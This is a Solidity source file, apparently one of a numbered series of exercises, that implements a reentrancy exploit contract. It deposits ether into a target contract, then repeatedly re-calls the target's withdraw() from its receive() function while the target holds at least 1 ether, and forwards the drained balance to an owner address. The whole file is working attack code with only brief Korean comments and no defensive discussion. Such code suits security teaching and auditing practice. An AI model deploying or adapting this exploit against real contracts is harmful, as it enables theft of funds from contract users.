// SPDX-License-Identifier: UNKNOWN 
pragma solidity ^0.7.0;

contract Exploit3_ReentrancyAttacks {
    address private _owner;
    address private _targetAddress;

    constructor(address owner, address targetAddress) {
        _owner = owner;
        _targetAddress = targetAddress;
    }

    // 자기 계좌에 이더 보내기;
    function deposit() public payable {
        (bool success,) = _targetAddress.call{value: msg.value}
            (abi.encodeWithSignature("deposit()"));
        require(success, "ReentrancyAttack: Failed to deposit");
    }

    // 재진입 공격
    function attack() public {
        (bool success, ) = _targetAddress.call(abi.encodeWithSignature("withdraw()"));
        require(success, "ReentrancyAttack: Failed to execute attack in attack");
    }

    // owner에게 얻은 돈 보내기
    function withdraw() public {
        (bool success,) = _owner.call{value: address(this).balance}("");
        require(success, "ReentrancyAttack: Faile withdraw");
    }

    receive() external payable {
        if(_targetAddress.balance >= 1 ether) {
            (bool success, ) = _targetAddress.call(abi.encodeWithSignature("withdraw()"));
            require(success, "ReentrancyAttack: Failed to execute attack in receive");
        }
    }
    fallback() external payable {}
}